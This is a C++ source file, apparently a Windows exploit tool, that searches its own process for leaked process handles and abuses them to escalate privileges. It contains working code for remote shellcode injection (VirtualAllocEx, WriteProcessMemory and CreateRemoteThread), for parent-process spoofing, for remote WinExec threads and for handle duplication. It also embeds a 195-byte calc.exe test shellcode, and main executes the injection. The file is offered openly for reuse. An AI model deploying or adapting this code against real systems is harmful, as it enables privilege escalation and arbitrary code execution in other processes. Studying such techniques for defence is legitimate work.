// leaky_handle_child.cpp : This file contains the 'main' function. Program execution begins and ends there.
/* by karan bamal */

#include <iostream>
#include <tchar.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Winternl.h> // for UNICODE_STRING and SYSTEM_INFORMATION_CLASS, some redefs might occur fixed them
#include <tchar.h>
#include <iostream>
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")


#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)

// defining structures - ignore maybe :!
/* The following structure is actually called SYSTEM_HANDLE_TABLE_ENTRY_INFO, but SYSTEM_HANDLE is shorter. */
typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

/* already defined in a winintrl header above
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING;
*/

typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);

typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI* _RtlEqualUnicodeString)(
	IN  PUNICODE_STRING String1,
	IN  PUNICODE_STRING String2,
	IN  BOOLEAN CaseInSensitive
	);

typedef NTSTATUS(WINAPI* _RtlInitUnicodeString)(
	PUNICODE_STRING target, /* [I/O] Buffered unicode string to be initialized */
	PCWSTR source);          /* [I]   '\0' terminated unicode string used to initialize target */


HANDLE GetLeakedHandle()
{   
	// declare everything we need
#define SystemHandleInformation 16

    ULONG hInfoSize = 0x1000;
    NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(hInfoSize);
	HANDLE hProc = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	PVOID objectNameInfo;
	UNICODE_STRING objectName;

	// use Ntdll exported functions.
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	DWORD dwOwnPID = GetCurrentProcessId();

	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	_NtDuplicateObject pNtDuplicateObject = (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
	_RtlEqualUnicodeString pRtlEqualUnicodeString = (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
	
	ULONG_PTR pbi[6]; ULONG ulSize = 0;

	LONG(WINAPI * NtQueryInformationProcess)(HANDLE ProcessHandle,
		ULONG ProcessInformationClass, PVOID ProcessInformation,
		ULONG ProcessInformationLength, PULONG ReturnLength);

	*(FARPROC*)&NtQueryInformationProcess = GetProcAddress(
		hNtdll, "NtQueryInformationProcess");

	printf("[+] Initialization done, now fetchin all handles\n");

	//size is guessed with double size since we dont know size and NtQuerySysteminfo wont give us right one
	while ((status = pNtQuerySystemInformation(SystemHandleInformation, phHandleInfo, hInfoSize,NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, hInfoSize *= 2);
	
	if (status != STATUS_SUCCESS)
	{
		printf("[-] NtQuerySystemInformation failed, errcode: %d\n", GetLastError());
		return nullptr;
	}

	printf("[+] Fetched %d handles\n", phHandleInfo->HandleCount);
	printf("[+] Fetching handles of our process.\n");
	// now lets traverse in these
	for (int i = 0; i < phHandleInfo->HandleCount; i++) {
		SYSTEM_HANDLE handle = phHandleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo;
		PVOID objectNameInfo;
		UNICODE_STRING objectName;
		ULONG returnlength;

		// we just want handles of our process
		if (handle.ProcessId != GetCurrentProcessId())
			continue;

		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (NtQueryObject(
			(HANDLE)handle.Handle,
			OBJECT_INFORMATION_CLASS::ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		) != STATUS_SUCCESS ) {
			printf("[-] Error in querying %#x!, errcode %d\n", handle.Handle, GetLastError());
			continue;
		}
		
		// Query the object name unless it has an access 0x0012019f
		// NtQueryObject hangs on this one

		if (handle.GrantedAccess == 0x0012019f) {
			printf("[!] Skipping querying handle with permission 0x12019f\n");
			free(objectTypeInfo);
			continue;
		}
		
		// lets get name
		objectNameInfo = malloc(0x1000);

		if (NtQueryObject(
			(HANDLE)handle.Handle,
			1,
			objectNameInfo,
			0x1000,
			&returnlength
			)!= STATUS_SUCCESS) {

				// Reallocate the buffer and try again.
				objectNameInfo = realloc(objectNameInfo, returnlength);
				if (NtQueryObject(
					(HANDLE)handle.Handle,
					1,
					objectNameInfo,
					returnlength,
					NULL
					)!= STATUS_SUCCESS) {

					// We have the type name, so just display that.
					printf("[!] Cannot query name of [%#x] %.*S\n",
						handle.Handle,
						objectTypeInfo->TypeName.Length / 2,
						objectTypeInfo->TypeName.Buffer
					);
					free(objectTypeInfo);
					free(objectNameInfo);
					continue;
			}
		}
		// check for process or thread as we are concerned about that only right now.
		objectName = *(PUNICODE_STRING)objectNameInfo;
		UNICODE_STRING pProcess, pThread;

		pRtlInitUnicodeString(&pThread, L"Thread");
		pRtlInitUnicodeString(&pProcess, L"Process");

		// we need process
		if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
			printf("[+] Found process handle (%x)\n", handle.Handle);
			HANDLE hProcess = (HANDLE)handle.Handle;
			hProc = hProcess;

			if (NtQueryInformationProcess != NULL && NtQueryInformationProcess(
				hProc, 0, &pbi, sizeof(pbi), &ulSize) >= 0 &&
				ulSize == sizeof(pbi)) {
					std::cout << "[+] Fetching more details" << std::endl;
					std::cout << "[*] ExitStatus                     " << pbi[0] << std::endl;
					std::cout << "[*] PebBaseAddress                 " << pbi[1] << std::endl;
					std::cout << "[*] AffinityMask                   " << pbi[2] << std::endl;
					std::cout << "[*] BasePriority                   " << pbi[3] << std::endl;
					std::cout << "[**] UniqueProcessId               " << pbi[4] << std::endl;
					std::cout << "[**] InheritedFromUniqueProcessId  " << pbi[5] << std::endl;
			}
		}
		else if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pThread, TRUE)) {
			printf("[+] Found thread handle (%x)\n", handle.Handle);
			// return here for thread
		}
		else {
			printf(
				"[!] Found Handle %#x %.*S: %.*S\n",
				handle.Handle,
				objectTypeInfo->TypeName.Length / 2,
				objectTypeInfo->TypeName.Buffer,
				objectName.Length / 2,
				objectName.Buffer);
				free(objectTypeInfo);
				free(objectNameInfo);
			continue;
		}
		free(objectTypeInfo);
		free(objectNameInfo);
		
	};
	if (hProc != INVALID_HANDLE_VALUE && hProc != NULL) {
		printf("[+] Returning valid leaky handle\n");
	}
	return hProc;
};

uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName)
{
	uintptr_t modBaseAddr = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		MODULEENTRY32 modEntry;
		modEntry.dwSize = sizeof(modEntry);
		if (Module32First(hSnap, &modEntry))
		{
			do
			{
				if (!_wcsicmp(modEntry.szModule, modName))
				{
					modBaseAddr = (uintptr_t)modEntry.modBaseAddr;
					break;
				}
			} while (Module32Next(hSnap, &modEntry));
		}
	}
	CloseHandle(hSnap);
	return modBaseAddr;
}

void process_all_access(HANDLE& handle, const char* payload, int size) {
	//create buffer
	LPVOID buffer = VirtualAllocEx(handle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!WriteProcessMemory(handle, buffer, payload, size, NULL)) {
		printf("[-] WriteProcessMemory Failed, errcode %d\n", GetLastError());
		return;
	}
	if (!CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, NULL)) {
		printf("[-] CreateRemoteThread Failed, errcode %d\n", GetLastError());
		return;
	};
	printf("[+] Success!!!\n");
	return;
}

// feel free to pass nullptr in appname, if you know what you doing
void process_create_process(HANDLE& handle, wchar_t AppName[], wchar_t Command[]) {
	STARTUPINFOEX si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);

	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T size = 0;
	
	// change parent of this process to our handle
	InitializeProcThreadAttributeList(NULL, 1, 0, &size); // to get size
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size); // now allocate
	InitializeProcThreadAttributeList(ptList, 1, 0, &size); // initialize

	if (!UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &handle, sizeof(HANDLE), NULL, NULL)) {
		printf("[-] UpdateProcThreadAttribute failed, errcode %d\n", GetLastError());
		return;
	};
	si.lpAttributeList = ptList;

	// a bug in windows api requires the param of commandline to be modifiable, this is not present in CreateProcessA
	// because of this typecast is necssary when passing arguements
	if (!CreateProcessW(AppName, Command, nullptr, nullptr, TRUE, EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, &si.StartupInfo, &pi)) {
		printf("[-] CreateProcessW failed, errcode %d\n", GetLastError());
		return;
	};

	// clean up
	DeleteProcThreadAttributeList(ptList);
	free(ptList);

	printf("[+] Success!!!\n");
}

// requires reverse engineering, we cant store the value to be called in target binary with elevated privileges
// Simply dump the strings of the parent or any module included and find a call to any exe file
void process_create_thread(HANDLE &handle, const WCHAR modulename[], int offset) {
	DWORD stringcmd = (GetModuleBaseAddress(GetCurrentProcessId(), modulename) + offset);

	HANDLE hThread = CreateRemoteThread(handle, NULL, 0,
		(LPTHREAD_START_ROUTINE)WinExec, // LoadLibraryA works too 
		(LPVOID)stringcmd,
		0, NULL);
		
}

void process_dup_handle(HANDLE &handle, const char* payload, int size) {

	HANDLE hDup = NULL;
	DuplicateHandle(handle, GetCurrentProcess(), GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, 0, 0);
	
	LPVOID buffer = VirtualAllocEx(handle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!WriteProcessMemory(handle, buffer, payload, size, NULL)) {
		printf("[-] WriteProcessMemory Failed, errcode %d\n", GetLastError());
		return;
	}
	if (!CreateRemoteThread(handle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, NULL)) {
		printf("[-] CreateRemoteThread Failed, errcode %d\n", GetLastError());
		return;
	};
	printf("[+] Success!!!\n");
}

int main(int argc, char** argv)
{
	printf("# By Karan Bamal, feel free to use, just dont remove credits.\n");

	// get leaked handle
	HANDLE leaked_handle = GetLeakedHandle();
	if (leaked_handle == NULL) {
		printf("[-] No process handle found, exiting.\n");
		return -1;
	}
	// calc.exe shell code 195 bytes long 32 bit for testing
	// https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
	char code[] = \
		"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
		"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
		"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
		"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
		"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
		"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
		"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
		"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
		"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
		"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
		"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
		"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
		"\x52\xff\xd0";

#if 0 // move the call you want to use out of this block.

	process_all_access(leaked_handle, code, 195);
	 
	process_create_process(leaked_handle, (wchar_t*)L"C:\\Windows\\notepad.exe", (wchar_t*)L"notepad");

	process_create_thread(leaked_handle, "module_name.dll", 0x00)

	process_dup_handle(leaked_handle, code, 195);
#endif	

	process_all_access(leaked_handle, code, 195);
	int a;std::cin >> a;
	return 0;
}
